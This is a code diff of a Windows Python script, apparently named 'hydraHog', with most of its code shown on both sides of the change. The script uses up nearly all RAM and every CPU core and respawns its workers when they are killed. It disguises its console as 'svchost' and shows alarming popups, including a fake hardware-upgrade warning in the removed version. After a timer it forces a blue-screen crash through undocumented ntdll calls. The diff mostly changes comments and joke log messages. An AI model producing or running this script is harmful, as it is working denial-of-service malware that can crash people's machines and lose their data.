@@ -11,26 +11,13 @@ import win32api
 import win32clipboard
 
 # ---------------- CONFIGURATION (a.k.a. the Control Panel of Doom) ----------------
-# 🕵️‍♂️ Give your script a disguise like it's sneaking into the Pentagon
-SCRIPT_NAME = "svchost"  # Suggestions: 'chrome', 'explorer', or 'DefinitelyNotMalware.exe'
-
-# 🧠 How greedy should we get? Percentage of total RAM to eat like Pac-Man
-RAM_TARGET_PERCENT = 99  # 100% = your system cries in binary
-
-# 🍕 Size of RAM chunks per process, in MB. Bigger = fewer but heavier hogs
-RAM_WORKER_CHUNK_MB = 200  # Or crank it to 512MB and watch the world burn
-
-# 🔥 Number of CPU cores to abuse like you're mining Dogecoin on a calculator
-CPU_WORKERS = multiprocessing.cpu_count()  # Or manually pick your poison
-
-# 💣 Countdown to doom. Time in minutes before system-triggered self-destruction
-CRASH_TIMER_MINUTES = 5  # Set to 0 to go soft... but why would you?
-
-# 📜 Toggle logs because even chaos deserves documentation
-ENABLE_LOGGING = True
-
-# 🎹 Hotkey combo ID (CTRL+ALT+P). It's the "oh crap" button
-HOTKEY_ID = 1
+SCRIPT_NAME = "svchost"  # Give it a boring name, like a spy in a trench coat
+RAM_TARGET_PERCENT = 99  # How hungry? 0–100%
+RAM_WORKER_CHUNK_MB = 200  # Size of each RAM goblin
+CPU_WORKERS = multiprocessing.cpu_count()  # Or set manually to go off-script
+CRASH_TIMER_MINUTES = 5  # How long until we hit "Bye, Windows!"
+ENABLE_LOGGING = True  # Chaos should be documented for legal reasons
+HOTKEY_ID = 1  # CTRL+ALT+P = PANIC button
 
 # ---------------- LOGGING ----------------
 if ENABLE_LOGGING:
@@ -43,9 +30,9 @@ if ENABLE_LOGGING:
             logging.StreamHandler()
         ]
     )
-    logging.info(f"[{SCRIPT_NAME}] Logger booted like a caffeinated penguin")
+    logging.info("🪓 hydraHog is sharpening its tusks. Let the feast begin.")
 
-# ---------------- GLOBAL STATE (We live here now) ----------------
+# ---------------- GLOBAL STATE ----------------
 ram_processes = []
 cpu_processes = []
 is_paused = False
@@ -53,16 +40,16 @@ has_warned = False
 crash_triggered = False
 hogging_started = None
 
-# ---------------- RAM HOGGING (aka Eat Pray Lag) ----------------
+# ---------------- RAM HOGGING ----------------
 def ram_hog_worker(size_mb):
     try:
         chunk = bytearray(size_mb * 1024 * 1024)
         while True:
             for i in range(0, len(chunk), 4096):
-                chunk[i] = (chunk[i] + 1) % 256  # Keep the OS from paging it out like a nosy ex
+                chunk[i] = (chunk[i] + 1) % 256
             time.sleep(0.05)
     except Exception as e:
-        logging.error(f"[RAM Worker] Had an oopsie: {e}")
+        logging.error(f"💥 RAM Goblin exploded: {e}")
 
 def get_total_ram_mb():
     class MEMORYSTATUSEX(ctypes.Structure):
@@ -87,7 +74,7 @@ def spawn_ram_hogs():
     total_ram = get_total_ram_mb()
     target_ram = (total_ram * RAM_TARGET_PERCENT) / 100
     num_instances = int(target_ram / RAM_WORKER_CHUNK_MB)
-    logging.info(f"[RAM] Targeting {target_ram:.0f}MB across {num_instances} gluttonous goblins")
+    logging.info(f"🧠 RAM gluttony mode: Targeting {target_ram:.0f}MB via {num_instances} angry goblins")
 
     for _ in range(num_instances):
         p = multiprocessing.Process(target=ram_hog_worker, args=(RAM_WORKER_CHUNK_MB,))
@@ -103,18 +90,18 @@ def monitor_ram_processes():
         if not is_paused:
             for i, p in enumerate(ram_processes):
                 if not p.is_alive():
-                    logging.warning("[RAM] Goblin down! Respawning...")
+                    logging.warning("⚰️ RAM Hog died. CPR initiated.")
                     new_p = multiprocessing.Process(target=ram_hog_worker, args=(RAM_WORKER_CHUNK_MB,))
                     new_p.daemon = True
                     new_p.start()
                     ram_processes[i] = new_p
         time.sleep(1)
 
-# ---------------- CPU HOGGING (One core to rule them all) ----------------
+# ---------------- CPU HOGGING ----------------
 def cpu_hog_worker():
     x = 0.0001
     while True:
-        x = x ** 1.000001  # Useless math = max heat
+        x = x ** 1.000001
 
 def spawn_cpu_hogs():
     for _ in range(CPU_WORKERS):
@@ -122,7 +109,7 @@ def spawn_cpu_hogs():
         p.daemon = True
         p.start()
         cpu_processes.append(p)
-    logging.info(f"[CPU] Deployed {CPU_WORKERS} miners of mayhem")
+    logging.info(f"🔥 Deployed {CPU_WORKERS} brainless miners to burn silicon")
     threading.Thread(target=monitor_cpu_processes, daemon=True).start()
 
 def monitor_cpu_processes():
@@ -130,19 +117,19 @@ def monitor_cpu_processes():
         if not is_paused:
             for i, p in enumerate(cpu_processes):
                 if not p.is_alive():
-                    logging.warning("[CPU] Core died. Frankenstein mode activated.")
+                    logging.warning("⚡ CPU minion crashed. Reviving...")
                     new_p = multiprocessing.Process(target=cpu_hog_worker)
                     new_p.daemon = True
                     new_p.start()
                     cpu_processes[i] = new_p
         time.sleep(1)
 
-# ---------------- GLOBAL HOTKEY (Emergency eject: CTRL+ALT+P) ----------------
+# ---------------- HOTKEY ----------------
 def toggle_pause():
     global is_paused, hogging_started
     is_paused = not is_paused
     if is_paused:
-        logging.info("[Control] PAUSE engaged. Mercy granted.")
+        logging.info("🛑 HydraHog paused. Sweet relief.")
         for p in ram_processes + cpu_processes:
             if p.is_alive():
                 p.terminate()
@@ -150,7 +137,7 @@ def toggle_pause():
         cpu_processes.clear()
         hogging_started = None
     else:
-        logging.info("[Control] Back to the trenches. Hogging resumed.")
+        logging.info("⚔️ Resume hogging. WAR!")
         spawn_ram_hogs()
         spawn_cpu_hogs()
 
@@ -167,33 +154,40 @@ def handle_hotkeys():
     class_atom = win32gui.RegisterClass(wc)
     hwnd = win32gui.CreateWindow(wc.lpszClassName, "", 0, 0, 0, 0, 0, 0, 0, hinst, None)
 
-    win32gui.RegisterHotKey(hwnd, HOTKEY_ID, win32con.MOD_CONTROL | win32con.MOD_ALT, 0x50)  # P key
-    logging.info("[Hotkeys] CTRL+ALT+P bound to global panic button")
+    win32gui.RegisterHotKey(hwnd, HOTKEY_ID, win32con.MOD_CONTROL | win32con.MOD_ALT, 0x50)  # CTRL+ALT+P
+    logging.info("🎹 Hotkey bound. CTRL+ALT+P = Save thy soul")
 
     win32gui.PumpMessages()
 
-# ---------------- PRIORITY MODE (We go fast. Like Sonic.) ----------------
+# ---------------- PRIORITY ----------------
 def raise_priority():
     try:
         ctypes.windll.kernel32.SetPriorityClass(
-            ctypes.windll.kernel32.GetCurrentProcess(), 0x00000080  # HIGH_PRIORITY_CLASS
+            ctypes.windll.kernel32.GetCurrentProcess(), 0x00000080
         )
-        logging.info("[System] HIGH priority acquired. Hold my beer.")
+        logging.info("🏎️ Raised process priority. Vroom vroom.")
     except Exception as e:
-        logging.warning(f"[System] Could not raise priority: {e}")
+        logging.warning(f"🛑 Couldn't raise priority: {e}")
 
-# ---------------- FRIENDLY REMINDER (aka pop-up of doom) ----------------
+# ---------------- WARNING POPUPS ----------------
+WARNING_MESSAGES = [
+    "💀 RAM's in hospice. Last rites incoming.",
+    "🔥 Your PC is melting faster than your dreams.",
+    "📉 System performance dropped harder than crypto.",
+    "😭 RAM is screaming. CPU left the chat.",
+    "🚽 Memory flushed. Performance? Gone with the wind."
+]
+
 def warning_loop():
     global has_warned
     while True:
         if not is_paused and not has_warned:
-            ctypes.windll.user32.MessageBoxW(0,
-                "Your PC is running low on resources. A hardware upgrade is recommended.",
-                "Hardware Performance Warning", 0x30)
+            msg = random.choice(WARNING_MESSAGES)
+            ctypes.windll.user32.MessageBoxW(0, msg, "⚠️ System Breakdown Approaching", 0x30)
             has_warned = True
         time.sleep(5)
 
-# ---------------- SELF-DESTRUCT INITIATOR (Hydrogen bomb, digital edition) ----------------
+# ---------------- CRASH ----------------
 def crash_timer():
     global crash_triggered
     while True:
@@ -201,7 +195,7 @@ def crash_timer():
             elapsed = time.time() - hogging_started
             if elapsed > CRASH_TIMER_MINUTES * 60 and not crash_triggered:
                 crash_triggered = True
-                logging.warning("[CRASH] BOOM scheduled. Initiating fail spectacularly.")
+                logging.warning("💣 Time’s up. Releasing the Kraken...")
                 trigger_bsod()
         time.sleep(5)
 
@@ -210,12 +204,12 @@ def trigger_bsod():
         ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_long()))
         ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(ctypes.c_long()))
     except Exception as e:
-        logging.error(f"[CRASH] BSOD failed. Drama canceled: {e}")
+        logging.error(f"💔 BSOD failed. Windows chose peace: {e}")
 
-# ---------------- MAIN ENGINE ROOM (Where chaos is born) ----------------
+# ---------------- MAIN ----------------
 if __name__ == '__main__':
     multiprocessing.freeze_support()
-    ctypes.windll.kernel32.SetConsoleTitleW(SCRIPT_NAME)  # Give the console a CIA alias
+    ctypes.windll.kernel32.SetConsoleTitleW(SCRIPT_NAME)
     raise_priority()
     threading.Thread(target=handle_hotkeys, daemon=True).start()
     spawn_ram_hogs()
@@ -224,3 +218,4 @@ if __name__ == '__main__':
     threading.Thread(target=crash_timer, daemon=True).start()
     while True:
         time.sleep(1)
+    
